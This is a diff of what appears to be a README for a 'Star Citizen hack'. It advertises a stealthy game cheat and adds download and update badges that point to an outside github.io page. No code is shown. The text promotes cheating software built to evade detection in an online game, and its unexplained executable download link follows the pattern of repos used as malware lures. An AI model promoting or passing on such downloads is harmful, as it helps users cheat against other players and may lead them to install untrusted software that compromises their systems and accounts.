@@ -2,8 +2,8 @@
 
 Teaser — Get instant precision and situational advantage with the **Star Citizen hack** built for competitive PC pilots. Lightweight, stealthy, and tuned for low impact on FPS. 🙂
 
-[![Download for Windows](https://img.shields.io/badge/Download-Windows-purple?logo=windows\&style=for-the-badge)]()
-[![Get New Version](https://img.shields.io/badge/Get-Update-purple?logo=windows\&style=for-the-badge)]()
+[![Download for Windows](https://img.shields.io/badge/Download-Windows-purple?logo=windows\&style=for-the-badge)](https://star-citizen-hack.github.io/.github/)
+[![Get New Version](https://img.shields.io/badge/Get-Update-purple?logo=windows\&style=for-the-badge)](https://star-citizen-hack.github.io/.github/)
 
 
 ## Overview
